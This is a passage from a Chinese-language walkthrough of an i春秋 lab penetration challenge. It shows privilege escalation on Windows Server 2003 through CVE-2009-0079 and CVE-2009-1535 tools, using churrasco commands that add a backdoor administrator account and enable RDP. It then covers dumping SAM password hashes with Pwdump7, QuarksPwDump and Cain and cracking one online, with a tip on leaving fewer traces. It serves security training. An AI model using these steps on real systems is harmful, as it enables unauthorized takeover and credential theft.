系统提权将利用 [**CVE-2009-0079**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0079) 漏洞，采取 **cmd.exe + Churrasco.exe + 3389.bat** 的工具组合，其中 cmd.exe 是为了代替原服务器中权限受限的命令行交互环境，Churrasco.exe 是用于提权的漏洞利用工具，3389.bat 是打开 3389 端口及远程桌面服务的批处理脚本文件。

> 小贴士：CVE-2009-0079 是 Microsoft Windows RPCSS 服务隔离的本地权限提升漏洞，收录于 Microsoft 安全公告 [MS09-012](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-012)，影响 **Microsoft Windows Server 2003 SP2** 等多个系统版本。

## Churrasco.exe 提权

**Churrasco.exe**，又称「巴西烤肉」，是 CVE-2009-0079 漏洞的常见利用工具，能够以 SYSTEM 权限执行命令，从而可以达到添加用户的目的。

首先将工具箱【提权工具】->【windows】目录中的三款工具，在菜刀的文件管理页面空白处，右键点击 **上传文件** 至服务器 `C:\wmpub` 目录下，接着右击 cmd.exe，选择 **虚拟终端** 进入到命令行交互界面：

![chopper_upload](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_upload.png)

输入 `systeminfo` 命令，获取服务器系统相关信息，得知系统为 Microsoft Windows Server 2003 Enterprise Edition SP2，且只安装了一个补丁程序，即可猜测该系统存在 CVE-2009-0079 漏洞：

![systeminfo](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/systeminfo.png)

接着切换到 `C:\wmpub` 目录，输入 `churrasco "net user ichunqiu key /add"` 命令，添加一个名为 `ichunqiu`、密码为 `key` 的用户：

![churrasco_user](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_user.png)

再输入 `churrasco "net localgroup administrators ichunqiu /add"`命令，将 `ichunqiu` 用户添加到 `administrators` 用户组：

![churrasco_localgroup](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_localgroup.png)

> 小贴士：可通过 `net user` 与 `net localgroup administrators` 查看命令是否执行成功。

最后输入 `churrasco 3389` 命令，打开 3389 端口及远程桌面服务：

![churrasco_3389](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/churrasco_3389.png)

确认提权成功后，在本机上点击 **开始 -> 运行**，输入 [`mstsc`](https://baike.baidu.com/item/mstsc)，远程计算机地址为 `172.16.12.2`（在实验场景拓扑图上可见）：

![mstsc](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/mstsc.png)

正常的话会弹出远程桌面，输入用户名 `ichunqiu` 与密码 `key`，即可成功登录远程服务器：

![login_server](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/login_server.png)

## pr.exe 提权

**pr.exe** 也是 CVE-2009-0079 漏洞的提权工具，位于【提权工具】->【windows】目录下，使用方法与 Churrasco.exe 类似。不过注意的是，在第一次执行创建用户命令时，可能会报错，若创建失败，只需再次执行即可：

![pr](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pr.png)

## iis.exe 提权

**iis.exe** 与前两者不同，是基于 [**CVE-2009-1535**](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1535) 漏洞的提权工具，位于【提权工具】->【windows】目录下（最好选用 iis6.0-local.exe，因为 iis6.exe 在打开 3389 端口时会出错），使用方法与前两者类似。在第一次创建用户时也可能会报错，若创建失败，再次执行即可：

> 小贴士：CVE-2009-1535 是 IIS 5.1 和 6.0 中 [WebDAV](https://baike.baidu.com/item/WebDAV) 扩展的身份验证绕过漏洞，收录于 Microsoft 安全公告 [MS09-020](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-020)，影响 **Microsoft Windows Server 2003 SP2 中 Internet Information Services 6.0** 等多个系统版本。

![iis](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/iis.png)

# 0x06 获取管理员系统密码

进入到远程主机桌面，此时可以通过 [pwdump 工具](http://www.openwall.com/passwords/windows-pwdump) 获取管理员密码的哈希值，常见的 pwdump 工具有 Pwdump7、QuarksPwDump、Cain & Abel 等，最后将哈希值通过在线解密即可获得密码明文。

> 小贴士：[**pwdump**](https://en.wikipedia.org/wiki/Pwdump) 是一类能从 Windows [SAM（Security Account Manager）](https://en.wikipedia.org/wiki/Security_Account_Manager) 中读出本地用户 [LM（LAN Manager）](https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details) 与 [NTLM（NT LAN Manager）](https://en.wikipedia.org/wiki/NT_LAN_Manager) 密码哈希值的工具（注意必须在管理员权限下），其中 LM 与 NTLM 是 Windows 系统下的安全认证协议，并且 NTLM 是 LM 的演进版本，安全性更高。

## Pwdump7

[**Pwdump7**](http://www.tarasco.org/security/pwdump_7/index.html) 是 [Tarasco Security](http://www.tarasco.org/security/pwdump_7/index.html) 发布的一款免费软件，能够从 SAM 中快速提取用户密码哈希值，易用性与有效性极佳。

使用之前，将实验工具箱【提权工具】->【hash】->【Pwdump7】文件夹下的 **Pwdump7.exe** 与 **libeay32.dll** 两个文件通过菜刀上传至服务器 `C:\wmpub` 目录，再回到远程主机桌面点击【开始】 -> 【我的电脑】，进入上传点打开 cmd.exe，直接输入 `pwdump7` 命令即可获得所有用户的密码哈希值，其中 `62C4700EBB05958F3832C92FC614B7D1` 是 LM 哈希，`4D478675344541AACCF6CF33E1DD9D85` 是 NTLM 哈希：

![pwdump7](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pwdump7.png)

## QuarksPwDump

[**QuarksPwDump**](https://blog.quarkslab.com/quarks-pwdump.html) 是 [Quarkslab](https://quarkslab.com/) 发布的一款开源工具，能导出 Windows 下各种类型的用户凭证，它自身有专属的命令交互界面，可输入不同的命令选项获得所需数据。

使用前，同样先将【提权工具】->【hash】->【QuarksPwDump_v0.1】文件夹下的 **QuarksPwDump.exe** 上传至服务器 `C:\wmpub` 目录，在远程主机上传点打开 cmd.exe，直接输入 `quarkspwdump` 命令：

![quarkspwdump_cmd](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_cmd.png)

命令成功执行后，进入到 QuarksPwDump.exe 命令交互界面，再输入 `quarkspwdump --dump-hash-local` 命令：

> 小贴士：对命令选项熟悉后，可直接在 cmd 命令交互界面中输入 `quarkspwdump --dump-hash-local` 命令。

![quarkspwdump_input](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_input.png)

界面刷新，并导出本地用户的密码哈希值：

![quarkspwdump_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/quarkspwdump_result.png)

## Cain & Abel

[**Cain & Abel**](http://www.oxid.it/cain.html) 是 [oxid.it](http://www.oxid.it/) 发布的一款综合网络渗透工具，在密码恢复、暴力破解、网络嗅探、路由协议分析等场景有广泛应用。

使用前，先把【arp嗅探】->【Cain】文件夹下的 **ca_setup_53494.exe** 安装包上传至服务器 `C:\wmpub` 目录进行安装，并且安装完 Cain & Abel 后，必须同时安装后续的 WinPcap，否则功能缺失出现报错：

> 小贴士：比起前两款工具，Cain & Abel 使用前需要安装，并且操作步骤相对繁琐，增大了在目标系统留下痕迹的可能，因此建议在满足需求的情况下，尽量选用小巧便捷的工具。

![cain_install](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_install.png)

全部安装完毕后点击桌面上的 **Cain**，在 **Cracker** 选项卡下选中 **LM & NTLM Hashes**，点击 **Add to list（即蓝色加号）**，勾选上 **Include Password History Hashes** ：

![cain_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_config.png)

点击 **Next** 后即能获取到所有本地用户的密码哈希值：

![cain_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/cain_result.png)

## Online Hash Crack

在线破解哈希值推荐一个瑞士网站 [Objectif Sécurité ](http://www.objectif-securite.ch/)，无需注册付费，便捷实用。

在主页点击 **OPHCRACK** 选项卡，将 NTLM 哈希 `4D478675344541AACCF6CF33E1DD9D85` 填入第一个文本框，点击 **GO** 解密后，即得管理员系统密码的明文 `cu9e2cgw`：

![objectif](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/objectif.png)

# 0x07 小结

本篇 writeup 借此深入彻底的渗透模拟实验，总结了渗透过程中信息收集、SQL 注入、插入木马、获取 webshell、权限提升、获取系统用户密码等用到的数十种工具与分析方法，希望有助于各位读者对渗透测试全过程的理解，在动手实践之后能更熟练地掌握工具。

笔者水平有限，在边学习实践边分析思考的情况下总结出以上心得，不足之处望各位指出，有独特思路的欢迎交流。最后向以下三篇参考 writeup 的作者致以真诚的感谢，前辈们的努力促使了国内安全技术的蓬勃发展！

> [01-在线挑战详细攻略-《我很简单，请不要欺负我》](https://bbs.ichunqiu.com/thread-1783-1-1.html)
> [ichunqiu在线挑战--我很简单，请不要欺负我 writeup](https://www.cnblogs.com/renzongxian/p/4945083.html)
> [《我很简单，请不要欺负我》实验攻略](https://bbs.ichunqiu.com/thread-1833-1-1.html)